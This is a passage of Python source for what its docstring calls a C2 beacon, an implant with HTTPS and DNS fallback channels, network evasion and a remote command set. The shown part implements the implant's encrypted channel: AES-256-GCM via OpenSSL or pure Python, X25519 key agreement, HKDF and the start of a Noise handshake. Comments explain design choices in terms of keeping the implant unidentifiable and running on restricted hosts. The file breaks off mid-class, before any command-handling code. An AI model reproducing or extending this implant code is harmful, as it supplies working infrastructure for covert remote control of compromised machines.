#!/usr/bin/env python3
"""
C2 beacon with HTTPS primary and DNS fallback channels.
AES-GCM encrypted payloads, Venom-style network evasion,
full command set with result reporting.

Zero external dependencies — stdlib only.
"""

import base64
import ctypes
import ctypes.util
import errno
import hashlib
import hmac
import io
import json
import logging
import os
import platform
import random
import re
import shutil
import socket
import ssl
import stat
import struct
import subprocess
import sys
import threading
import time
import urllib.error
import zipfile
import urllib.request
from pathlib import Path
from typing import Callable, Iterable, Optional, Tuple

logger = logging.getLogger("raccoon.c2")

_SYSFS_NET = "/sys/class/net"
_PROC_NET_ROUTE = "/proc/net/route"
_MONITOR_DRIVERS = ("88XXau", "rtl8812au", "8812au")

KEY_GENERATOR = ('python3 -c "import os,base64; '
                 'print(base64.b64encode(os.urandom(32)).decode())"')


def decode_key(value, field: str = "encryption_key") -> bytes:
    """The AES-256-GCM key in `value`, or a ValueError naming what is wrong.

    Shared by the beacon, the team server and the launchers, so the rule and
    the wording cannot drift between them. There is no derivation and no default: a key that both ends can compute
    from the callback URL is a key anyone who sees one message can compute.
    The messages name the field and the problem and never the value or any
    part of it, and are raised outside the except block so the decoder's
    own error cannot ride along in the chain.
    """
    text = value.strip() if isinstance(value, str) else ""
    problem = None
    key = b""
    if not text:
        problem = ("%s is required: there is no default key and none is "
                   "derived. Generate one with: %s" % (field, KEY_GENERATOR))
    else:
        try:
            key = base64.b64decode(text, validate=True)
        except ValueError:
            problem = ("%s is not valid base64. Generate a key with: %s"
                       % (field, KEY_GENERATOR))
        else:
            if len(key) != 32:
                problem = ("%s decodes to %d bytes; AES-256-GCM needs "
                           "exactly 32. Generate a key with: %s"
                           % (field, len(key), KEY_GENERATOR))
    if problem:
        raise ValueError(problem)
    return key


def beacon_key_problem(config) -> Optional[str]:
    """Why the implant config cannot supply the beacon's key, or None.

    Asked only where a Python beacon can be built: c2 and the fallback both
    enabled. A config that builds none needs no key, and demanding one would
    break it. Checked when the config is loaded so a bad key stops the
    process before the sniffer and cover are up, not after.
    """
    c2 = config.get("c2") if isinstance(config, dict) else None
    if not isinstance(c2, dict) or not c2.get("enabled"):
        return None
    fallback = c2.get("fallback")
    if not isinstance(fallback, dict) or not fallback.get("enabled"):
        return None
    try:
        decode_key(c2.get("encryption_key"), "c2.encryption_key")
    except ValueError as exc:
        return str(exc)
    return None


# ── Stdlib AES-256-GCM via OpenSSL ctypes ──

def _load_libcrypto():
    """Load OpenSSL libcrypto. Returns None if unavailable (macOS Library Validation)."""
    if platform.system() == "Darwin":
        brew_paths = [
            "/opt/homebrew/opt/openssl/lib/libcrypto.dylib",
            "/opt/homebrew/lib/libcrypto.dylib",
            "/usr/local/opt/openssl/lib/libcrypto.dylib",
            "/usr/local/lib/libcrypto.dylib",
            "/opt/local/lib/libcrypto.dylib",
        ]
        for p in brew_paths:
            if os.path.isfile(p):
                try:
                    return ctypes.CDLL(p)
                except OSError:
                    continue
    for name in ("libcrypto-3", "libcrypto-3-x64", "libcrypto-1_1",
                 "libcrypto-1_1-x64", "libcrypto"):
        path = ctypes.util.find_library(name)
        if path:
            try:
                return ctypes.CDLL(path)
            except OSError:
                continue
    ssl_path = getattr(ssl, "_ssl", None)
    if ssl_path and hasattr(ssl._ssl, "__file__"):
        d = os.path.dirname(ssl._ssl.__file__)
        for fn in os.listdir(d):
            if "libcrypto" in fn.lower() and fn.endswith((".dll", ".so", ".dylib")):
                try:
                    return ctypes.CDLL(os.path.join(d, fn))
                except OSError:
                    continue
    ssl_dir = os.path.dirname(ssl.__file__)
    parent = os.path.dirname(ssl_dir)
    for search_dir in (ssl_dir, parent, os.path.join(parent, "DLLs"),
                       os.path.join(sys.prefix, "DLLs"),
                       os.path.join(sys.prefix, "lib")):
        if not os.path.isdir(search_dir):
            continue
        for fn in os.listdir(search_dir):
            if "libcrypto" in fn.lower() and fn.endswith((".dll", ".so", ".dylib")):
                try:
                    return ctypes.CDLL(os.path.join(search_dir, fn))
                except OSError:
                    continue
    return None


# ── Pure-Python AES-256-GCM (stdlib only, no ctypes) ──
# Used as fallback when libcrypto is unavailable (macOS Library Validation).

def _xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def _ghash_mul(x: bytes, h: bytes) -> bytes:
    """GF(2^128) multiplication for GHASH."""
    xi = int.from_bytes(x, "big")
    hi = int.from_bytes(h, "big")
    zi = 0
    R = 0xE1000000000000000000000000000000
    for i in range(128):
        if (xi >> (127 - i)) & 1:
            zi ^= hi
        carry = hi & 1
        hi >>= 1
        if carry:
            hi ^= R
    return zi.to_bytes(16, "big")


def _ghash(h: bytes, aad: bytes, ct: bytes) -> bytes:
    """GHASH function per NIST SP 800-38D."""
    def _pad16(data):
        r = len(data) % 16
        return data + b"\x00" * (16 - r) if r else data

    data = _pad16(aad) + _pad16(ct)
    data += (len(aad) * 8).to_bytes(8, "big") + (len(ct) * 8).to_bytes(8, "big")

    y = b"\x00" * 16
    for i in range(0, len(data), 16):
        block = data[i:i + 16]
        y = _ghash_mul(_xor(y, block), h)
    return y




# ── Pure-Python AES-256 single-block implementation ──

_AES_SBOX = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
]

_AES_RCON = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]


def _aes256_expand_key(key: bytes):
    """AES-256 key expansion → list of 15 round keys (each 16 bytes)."""
    w = list(struct.unpack(">8I", key))
    for i in range(8, 60):
        t = w[i - 1]
        if i % 8 == 0:
            t = ((t << 8) | (t >> 24)) & 0xFFFFFFFF
            t = ((_AES_SBOX[(t >> 24) & 0xFF] << 24) |
                 (_AES_SBOX[(t >> 16) & 0xFF] << 16) |
                 (_AES_SBOX[(t >> 8) & 0xFF] << 8) |
                 _AES_SBOX[t & 0xFF])
            t ^= _AES_RCON[i // 8 - 1] << 24
        elif i % 8 == 4:
            t = ((_AES_SBOX[(t >> 24) & 0xFF] << 24) |
                 (_AES_SBOX[(t >> 16) & 0xFF] << 16) |
                 (_AES_SBOX[(t >> 8) & 0xFF] << 8) |
                 _AES_SBOX[t & 0xFF])
        w.append(w[i - 8] ^ t)
    rks = []
    for r in range(15):
        rks.append(struct.pack(">4I", *w[r * 4:(r + 1) * 4]))
    return rks


def _aes256_block(key: bytes, block: bytes) -> bytes:
    """Encrypt a single 16-byte block with AES-256 (column-major state)."""
    rks = _aes256_expand_key(key)

    def xtime(a):
        return ((a << 1) ^ 0x1b) & 0xFF if a & 0x80 else (a << 1) & 0xFF

    # State is column-major: state[row][col] = block[col*4 + row]
    s = bytearray(_xor(block, rks[0]))

    for rnd in range(1, 14):
        # SubBytes
        s = bytearray(_AES_SBOX[b] for b in s)
        # ShiftRows (state[row*4+col] in our flat layout where index = col*4+row)
        # row 1: shift left 1
        s[1], s[5], s[9], s[13] = s[5], s[9], s[13], s[1]
        # row 2: shift left 2
        s[2], s[6], s[10], s[14] = s[10], s[14], s[2], s[6]
        # row 3: shift left 3
        s[3], s[7], s[11], s[15] = s[15], s[3], s[7], s[11]
        # MixColumns (operate on each column: indices col*4 .. col*4+3)
        t = bytearray(16)
        for col in range(4):
            i = col * 4
            a0, a1, a2, a3 = s[i], s[i+1], s[i+2], s[i+3]
            t[i]   = xtime(a0) ^ xtime(a1) ^ a1 ^ a2 ^ a3
            t[i+1] = a0 ^ xtime(a1) ^ xtime(a2) ^ a2 ^ a3
            t[i+2] = a0 ^ a1 ^ xtime(a2) ^ xtime(a3) ^ a3
            t[i+3] = xtime(a0) ^ a0 ^ a1 ^ a2 ^ xtime(a3)
        s = bytearray(_xor(bytes(t), rks[rnd]))

    # Final round (no MixColumns)
    s = bytearray(_AES_SBOX[b] for b in s)
    s[1], s[5], s[9], s[13] = s[5], s[9], s[13], s[1]
    s[2], s[6], s[10], s[14] = s[10], s[14], s[2], s[6]
    s[3], s[7], s[11], s[15] = s[15], s[3], s[7], s[11]
    return bytes(_xor(bytes(s), rks[14]))


def _aes_ctr_encrypt(key: bytes, nonce: bytes, data: bytes) -> bytes:
    """AES-256-CTR encryption (GCM uses CTR internally)."""
    out = bytearray()
    # GCM uses a 12-byte nonce + 4-byte big-endian counter starting at 2
    counter = 2
    for i in range(0, len(data), 16):
        cb = nonce + struct.pack(">I", counter)
        ks_block = _aes256_block(key, cb)
        chunk = data[i:i + 16]
        out.extend(_xor(chunk, ks_block[:len(chunk)]))
        counter += 1
    return bytes(out)


def _pure_aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes,
                          aad: bytes = b"") -> bytes:
    """Pure-Python AES-256-GCM encrypt. Returns ciphertext + 16-byte tag."""
    # H = AES(key, 0^128)
    h = _aes256_block(key, b"\x00" * 16)
    # Encrypt with CTR (counter starts at 2)
    ct = _aes_ctr_encrypt(key, nonce, plaintext)
    # GHASH
    ghash_val = _ghash(h, aad, ct)
    # Tag = GHASH XOR AES(key, nonce||0^31||1)
    j0 = nonce + b"\x00\x00\x00\x01"
    e_j0 = _aes256_block(key, j0)
    tag = _xor(ghash_val, e_j0)
    return ct + tag


def _pure_aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes,
                          aad: bytes = b"") -> bytes:
    """Pure-Python AES-256-GCM decrypt. Raises ValueError on auth failure."""
    if len(ciphertext_with_tag) < 16:
        raise ValueError("Ciphertext too short")
    ct = ciphertext_with_tag[:-16]
    tag = ciphertext_with_tag[-16:]
    # H = AES(key, 0^128)
    h = _aes256_block(key, b"\x00" * 16)
    # Verify tag
    ghash_val = _ghash(h, aad, ct)
    j0 = nonce + b"\x00\x00\x00\x01"
    e_j0 = _aes256_block(key, j0)
    expected_tag = _xor(ghash_val, e_j0)
    if tag != expected_tag:
        raise ValueError("GCM authentication failed — wrong key or corrupted data")
    # Decrypt
    return _aes_ctr_encrypt(key, nonce, ct)


# ── Load libcrypto or fall back to pure-Python ──

_crypto = _load_libcrypto()
_USE_PURE_PYTHON_AES = _crypto is None

if not _USE_PURE_PYTHON_AES:
    _crypto.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
    _crypto.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
    _crypto.EVP_aes_256_gcm.restype = ctypes.c_void_p
    _crypto.EVP_EncryptInit_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
        ctypes.c_char_p, ctypes.c_char_p,
    ]
    _crypto.EVP_EncryptInit_ex.restype = ctypes.c_int
    _crypto.EVP_DecryptInit_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
        ctypes.c_char_p, ctypes.c_char_p,
    ]
    _crypto.EVP_DecryptInit_ex.restype = ctypes.c_int
    _crypto.EVP_EncryptUpdate.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
        ctypes.c_char_p, ctypes.c_int,
    ]
    _crypto.EVP_EncryptUpdate.restype = ctypes.c_int
    _crypto.EVP_DecryptUpdate.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
        ctypes.c_char_p, ctypes.c_int,
    ]
    _crypto.EVP_DecryptUpdate.restype = ctypes.c_int
    _crypto.EVP_EncryptFinal_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
    ]
    _crypto.EVP_EncryptFinal_ex.restype = ctypes.c_int
    _crypto.EVP_DecryptFinal_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
    ]
    _crypto.EVP_DecryptFinal_ex.restype = ctypes.c_int
    _crypto.EVP_CIPHER_CTX_ctrl.argtypes = [
        ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_char_p,
    ]
    _crypto.EVP_CIPHER_CTX_ctrl.restype = ctypes.c_int

EVP_CTRL_GCM_SET_IVLEN = 0x9
EVP_CTRL_GCM_GET_TAG = 0x10
EVP_CTRL_GCM_SET_TAG = 0x11
GCM_TAG_LEN = 16


def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes,
                     aad: bytes = b"") -> bytes:
    """AES-256-GCM. Returns ciphertext with the 16-byte tag appended.

    `aad` is authenticated but not encrypted. It defaults to empty, which
    is what the beacon's own channels use; the Noise handshake below needs
    it, because Noise authenticates each handshake payload against the
    running handshake hash.
    """
    if _USE_PURE_PYTHON_AES:
        return _pure_aes_gcm_encrypt(key, nonce, plaintext, aad)
    ctx = _crypto.EVP_CIPHER_CTX_new()
    if not ctx:
        raise RuntimeError("EVP_CIPHER_CTX_new failed")
    try:
        cipher = _crypto.EVP_aes_256_gcm()
        if _crypto.EVP_EncryptInit_ex(ctx, cipher, None, None, None) != 1:
            raise RuntimeError("EncryptInit_ex (cipher) failed")
        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, len(nonce), None) != 1:
            raise RuntimeError("Set IV length failed")
        if _crypto.EVP_EncryptInit_ex(ctx, None, None, key, nonce) != 1:
            raise RuntimeError("EncryptInit_ex (key/iv) failed")

        outlen = ctypes.c_int(0)
        # AAD goes in with a NULL output buffer, before any plaintext.
        if aad and _crypto.EVP_EncryptUpdate(
                ctx, None, ctypes.byref(outlen), aad, len(aad)) != 1:
            raise RuntimeError("EncryptUpdate (aad) failed")
        out = ctypes.create_string_buffer(len(plaintext) + 16)
        if _crypto.EVP_EncryptUpdate(ctx, out, ctypes.byref(outlen), plaintext, len(plaintext)) != 1:
            raise RuntimeError("EncryptUpdate failed")
        ct_len = outlen.value

        final_buf = ctypes.create_string_buffer(16)
        final_len = ctypes.c_int(0)
        if _crypto.EVP_EncryptFinal_ex(ctx, final_buf, ctypes.byref(final_len)) != 1:
            raise RuntimeError("EncryptFinal_ex failed")
        ct_len += final_len.value

        tag = ctypes.create_string_buffer(GCM_TAG_LEN)
        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, GCM_TAG_LEN, tag) != 1:
            raise RuntimeError("Get tag failed")

        return out.raw[:ct_len] + tag.raw
    finally:
        _crypto.EVP_CIPHER_CTX_free(ctx)


def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes,
                     aad: bytes = b"") -> bytes:
    """The inverse of `_aes_gcm_encrypt`. Raises ValueError if the tag,
    the key, the nonce or `aad` does not match what was encrypted.
    """
    if _USE_PURE_PYTHON_AES:
        return _pure_aes_gcm_decrypt(key, nonce, ciphertext_with_tag, aad)
    if len(ciphertext_with_tag) < GCM_TAG_LEN:
        raise ValueError("Ciphertext too short")
    ct = ciphertext_with_tag[:-GCM_TAG_LEN]
    tag = ciphertext_with_tag[-GCM_TAG_LEN:]

    ctx = _crypto.EVP_CIPHER_CTX_new()
    if not ctx:
        raise RuntimeError("EVP_CIPHER_CTX_new failed")
    try:
        cipher = _crypto.EVP_aes_256_gcm()
        if _crypto.EVP_DecryptInit_ex(ctx, cipher, None, None, None) != 1:
            raise RuntimeError("DecryptInit_ex (cipher) failed")
        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, len(nonce), None) != 1:
            raise RuntimeError("Set IV length failed")
        if _crypto.EVP_DecryptInit_ex(ctx, None, None, key, nonce) != 1:
            raise RuntimeError("DecryptInit_ex (key/iv) failed")

        outlen = ctypes.c_int(0)
        if aad and _crypto.EVP_DecryptUpdate(
                ctx, None, ctypes.byref(outlen), aad, len(aad)) != 1:
            raise RuntimeError("DecryptUpdate (aad) failed")
        out = ctypes.create_string_buffer(len(ct) + 16)
        if _crypto.EVP_DecryptUpdate(ctx, out, ctypes.byref(outlen), ct, len(ct)) != 1:
            raise RuntimeError("DecryptUpdate failed")
        pt_len = outlen.value

        tag_buf = ctypes.create_string_buffer(tag)
        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, GCM_TAG_LEN, tag_buf) != 1:
            raise RuntimeError("Set tag failed")

        final_buf = ctypes.create_string_buffer(16)
        final_len = ctypes.c_int(0)
        if _crypto.EVP_DecryptFinal_ex(ctx, final_buf, ctypes.byref(final_len)) != 1:
            raise ValueError("GCM authentication failed — wrong key or corrupted data")
        pt_len += final_len.value

        return out.raw[:pt_len]
    finally:
        _crypto.EVP_CIPHER_CTX_free(ctx)


# ── X25519 key agreement via OpenSSL ctypes ──

_X25519_KEY_LEN = 32
# obj_mac.h. X25519 has no EVP_PKEY_CTX_new_id of its own: the raw-key
# constructors take the NID directly.
_NID_X25519 = 1034
# RFC 7748 §4.1: u = 9. A public key is the private scalar applied to it,
# so the keypair needs no separate OpenSSL code path.
_X25519_BASEPOINT = b"\x09" + b"\x00" * 31

# The raw-key API arrived in OpenSSL 1.1.1. An older libcrypto loads and
# serves AES-256-GCM perfectly well, so this flag is its own measurement
# and not a copy of _USE_PURE_PYTHON_AES -- and it is read at call time,
# so a test can force either backend.
_USE_PURE_PYTHON_X25519 = (
    _crypto is None
    or not hasattr(_crypto, "EVP_PKEY_new_raw_private_key")
    or not hasattr(_crypto, "EVP_PKEY_derive"))

if not _USE_PURE_PYTHON_X25519:
    _crypto.EVP_PKEY_new_raw_private_key.argtypes = [
        ctypes.c_int, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_size_t,
    ]
    _crypto.EVP_PKEY_new_raw_private_key.restype = ctypes.c_void_p
    _crypto.EVP_PKEY_new_raw_public_key.argtypes = [
        ctypes.c_int, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_size_t,
    ]
    _crypto.EVP_PKEY_new_raw_public_key.restype = ctypes.c_void_p
    _crypto.EVP_PKEY_free.argtypes = [ctypes.c_void_p]
    _crypto.EVP_PKEY_CTX_new.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
    _crypto.EVP_PKEY_CTX_new.restype = ctypes.c_void_p
    _crypto.EVP_PKEY_CTX_free.argtypes = [ctypes.c_void_p]
    _crypto.EVP_PKEY_derive_init.argtypes = [ctypes.c_void_p]
    _crypto.EVP_PKEY_derive_init.restype = ctypes.c_int
    _crypto.EVP_PKEY_derive_set_peer.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p,
    ]
    _crypto.EVP_PKEY_derive_set_peer.restype = ctypes.c_int
    _crypto.EVP_PKEY_derive.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_size_t),
    ]
    _crypto.EVP_PKEY_derive.restype = ctypes.c_int


# ── Pure-Python X25519 (stdlib only, no ctypes) ──
# Used as fallback when libcrypto is unavailable or predates the raw-key
# API. Not constant-time -- the conditional swap below is a Python `if`,
# as the pure AES above is also not constant-time. Both are a fallback
# for a host that denies us libcrypto, not a claim of side-channel
# resistance; the key is ephemeral and used for one handshake.

_X25519_P = 2 ** 255 - 19
_X25519_A24 = 121665


def _x25519_clamp(scalar: bytes) -> int:
    """The scalar as RFC 7748 §5 decodes it: low three bits and the top
    bit cleared, bit 254 set. Clearing the low bits confines the result to
    the prime-order subgroup; setting bit 254 fixes the ladder's length.
    """
    k = bytearray(scalar)
    k[0] &= 248
    k[31] &= 127
    k[31] |= 64
    return int.from_bytes(k, "little")


def _pure_x25519(private: bytes, peer_public: bytes) -> bytes:
    """Pure-Python X25519. The RFC 7748 §5 Montgomery ladder verbatim.

    255 iterations from bit 254 down, each a conditional swap followed by
    one differential add-and-double, then a single inversion by Fermat's
    little theorem. The top bit of the u-coordinate is masked off before
    use, which RFC 7748 §5 requires of every receiver.
    """
    p = _X25519_P
    k = _x25519_clamp(private)
    x1 = int.from_bytes(peer_public, "little") & ((1 << 255) - 1)
    x2, z2, x3, z3, swap = 1, 0, x1, 1, 0
    for t in range(254, -1, -1):
        k_t = (k >> t) & 1
        swap ^= k_t
        if swap:
            x2, x3 = x3, x2
            z2, z3 = z3, z2
        swap = k_t
        a = (x2 + z2) % p
        aa = (a * a) % p
        b = (x2 - z2) % p
        bb = (b * b) % p
        e = (aa - bb) % p
        c = (x3 + z3) % p
        d = (x3 - z3) % p
        da = (d * a) % p
        cb = (c * b) % p
        x3 = pow(da + cb, 2, p)
        z3 = (x1 * pow(da - cb, 2, p)) % p
        x2 = (aa * bb) % p
        z2 = (e * (aa + _X25519_A24 * e)) % p
    if swap:
        x2, x3 = x3, x2
        z2, z3 = z3, z2
    shared = (x2 * pow(z2, p - 2, p)) % p
    return shared.to_bytes(_X25519_KEY_LEN, "little")


def _x25519_keypair() -> Tuple[bytes, bytes]:
    """A fresh (private, public) X25519 keypair, 32 bytes each.

    The private key is 32 random bytes as RFC 7748 §6.1 specifies;
    clamping happens inside the scalar multiplication, so there is nothing
    to normalise here. The public key is derived through whichever backend
    is active, which keeps a keypair from one backend usable by the other.
    """
    private = os.urandom(_X25519_KEY_LEN)
    return private, _x25519(private, _X25519_BASEPOINT)


def _x25519(private: bytes, peer_public: bytes) -> bytes:
    """The 32-byte X25519 shared secret for `private` and `peer_public`.

    Both arguments must be exactly 32 bytes: a short or long key is a
    framing bug upstream, and the ladder would otherwise reinterpret it
    and return a secret the far end cannot reach. An all-zero result means
    the peer sent a low-order point, which yields a shared secret an
    attacker already knows; OpenSSL refuses to derive one and so does the
    pure path, so the two backends agree on the rejection too.
    """
    if len(private) != _X25519_KEY_LEN:
        raise ValueError("X25519 private key is %d bytes; it must be "
                         "exactly %d" % (len(private), _X25519_KEY_LEN))
    if len(peer_public) != _X25519_KEY_LEN:
        raise ValueError("X25519 peer public key is %d bytes; it must be "
                         "exactly %d" % (len(peer_public), _X25519_KEY_LEN))

    if _USE_PURE_PYTHON_X25519:
        shared = _pure_x25519(private, peer_public)
        if shared == b"\x00" * _X25519_KEY_LEN:
            raise ValueError("X25519 derivation failed — peer public key "
                             "is a low-order point")
        return shared

    pkey = _crypto.EVP_PKEY_new_raw_private_key(
        _NID_X25519, None, private, len(private))
    if not pkey:
        raise RuntimeError("EVP_PKEY_new_raw_private_key failed")
    peer = None
    ctx = None
    try:
        peer = _crypto.EVP_PKEY_new_raw_public_key(
            _NID_X25519, None, peer_public, len(peer_public))
        if not peer:
            raise RuntimeError("EVP_PKEY_new_raw_public_key failed")
        ctx = _crypto.EVP_PKEY_CTX_new(pkey, None)
        if not ctx:
            raise RuntimeError("EVP_PKEY_CTX_new failed")
        if _crypto.EVP_PKEY_derive_init(ctx) != 1:
            raise RuntimeError("EVP_PKEY_derive_init failed")
        if _crypto.EVP_PKEY_derive_set_peer(ctx, peer) != 1:
            raise RuntimeError("EVP_PKEY_derive_set_peer failed")
        outlen = ctypes.c_size_t(_X25519_KEY_LEN)
        out = ctypes.create_string_buffer(_X25519_KEY_LEN)
        if _crypto.EVP_PKEY_derive(ctx, out, ctypes.byref(outlen)) != 1:
            raise ValueError("X25519 derivation failed — peer public key "
                             "is a low-order point")
        return out.raw[:outlen.value]
    finally:
        if ctx:
            _crypto.EVP_PKEY_CTX_free(ctx)
        if peer:
            _crypto.EVP_PKEY_free(peer)
        _crypto.EVP_PKEY_free(pkey)


# ── HKDF, Noise's flavour ──

def _hkdf(chaining_key: bytes, input_material: bytes,
          num_outputs: int) -> Tuple[bytes, ...]:
    """Noise §4.3 HKDF: `num_outputs` 32-byte keys from a chaining key.

    This is RFC 5869 with the arguments Noise names and no `info`: the
    chaining key is the salt, so `temp_key = HMAC(chaining_key, ikm)` is
    RFC 5869's extract step, and each output is the expand step's next
    block, `HMAC(temp_key, previous || i)`. Signature follows Noise rather
    than RFC 5869 because the handshake state is what calls it -- with two
    outputs after a DH, three when it also needs a handshake hash.
    """
    if num_outputs not in (2, 3):
        raise ValueError("HKDF produces two or three outputs, not %r"
                         % (num_outputs,))
    temp_key = hmac.new(chaining_key, input_material, hashlib.sha256).digest()
    outputs = []
    previous = b""
    for i in range(1, num_outputs + 1):
        previous = hmac.new(temp_key, previous + bytes([i]),
                            hashlib.sha256).digest()
        outputs.append(previous)
    return tuple(outputs)


# ── Noise_NKpsk0_25519_AESGCM_SHA256 ──
#
# The Noise Protocol Framework, revision 34, for one pattern and one
# cipher suite. `NK` means the responder's static public key is known to
# the initiator in advance, as a pre-message, and the initiator has no
# static key of its own -- which is what an implant wants: nothing in the
# artifact identifies the build to a server it has not yet reached, and
# nothing in the artifact lets a second implant impersonate the server.
# `psk0` mixes a 32-byte pre-shared key in as the first token of the
# first message, so an unauthenticated peer cannot produce a message the
# responder will answer, and the responder has nothing to say to one.
#
#   NKpsk0:
#     <- s
#     ...
#     -> psk, e, es
#     <- e, ee
#
# Transport messages are capped at 65535 bytes including the 16-byte tag,
# because the framing above this carries a `>H` length prefix.

_NOISE_KEY_LEN = 32
# Noise §5.1: the counter must never reach 2**64-1.
_NOISE_MAX_NONCE = 2 ** 64 - 1

_NOISE_START = "start"
_NOISE_SENT_MESSAGE_ONE = "sent message 1"
_NOISE_READ_MESSAGE_ONE = "read message 1"
_NOISE_TRANSPORT = "transport"
_NOISE_FAILED = "failed"


def _noise_32_bytes(value, what: str) -> bytes:
    """`value` as 32 bytes, or a ValueError naming `what` and the length.

    Never names the value: every caller passes key material. Noise fixes
    every key in this suite at 32 bytes, and HKDF would happily accept a
    short one and produce a handshake that completed -- which is the worst
    outcome available for a secret, so the length is checked where it
    enters rather than where it fails.
    """
    if not isinstance(value, (bytes, bytearray)):
        raise ValueError("%s must be 32 bytes, not %s"
                         % (what, type(value).__name__))
    if len(value) != _NOISE_KEY_LEN:
        raise ValueError("%s is %d bytes; it must be exactly %d"
                         % (what, len(value), _NOISE_KEY_LEN))
    return bytes(value)


class _CipherState:
    """Noise §5.1 CipherState: one key and one 64-bit message counter.

    AESGCM's nonce is 32 bits of zeroes followed by the counter
    big-endian (Noise §12.3), so the counter is the whole of the replay
    protection: there is no window and no reordering, which is what a
    stream on top of TCP wants. A failed decryption does not advance it,
    so a tampered or duplicated frame cannot desynchronise the honest
    ones -- though Noise §5.1 requires the session be abandoned anyway.
    """

    def __init__(self, key: bytes):
        self._key = key
        self._nonce = 0

    def _current_nonce(self) -> bytes:
        if self._nonce >= _NOISE_MAX_NONCE:
            raise ValueError(
                "Noise cipher state is exhausted: the nonce reached "
                "2**64-1, and reusing one under the same key would void "
                "the cipher")
        return b"\x00" * 4 + struct.pack(">Q", self._nonce)

    def encrypt_with_ad(self, ad: bytes, plaintext: bytes) -> bytes:
        out = _aes_gcm_encrypt(self._key, self._current_nonce(), plaintext,
                               ad)
        self._nonce += 1
        return out

    def decrypt_with_ad(self, ad: bytes, ciphertext: bytes) -> bytes:
        out = _aes_gcm_decrypt(self._key, self._current_nonce(), ciphertext,
                               ad)
        self._nonce += 1
        return out


class _SymmetricState:
    """Noise §5.2 SymmetricState: the chaining key, the handshake hash,
    and the cipher state the two of them key.
    """

    def __init__(self, protocol_name: bytes):
        # InitializeSymmetric pads a protocol name shorter than the hash
        # with zeroes and hashes a longer one. This suite's name is
        # exactly 32 bytes -- SHA-256's output length -- so `h` is the
        # name verbatim and neither case can arise here.
        self._h = protocol_name
        self._ck = protocol_name
        self._cipher = None

    def handshake_hash(self) -> bytes:
        return self._h

    def mix_hash(self, data: bytes) -> None:
        self._h = hashlib.sha256(self._h + data).digest()

    def mix_key(self, input_material: bytes) -> None:
        self._ck, temp_key = _hkdf(self._ck, input_material, 2)
        self._cipher = _CipherState(temp_key)

    def mix_key_and_hash(self, input_material: bytes) -> None:
        self._ck, temp_h, temp_key = _hkdf(self._ck, input_material, 3)
        self.mix_hash(temp_h)
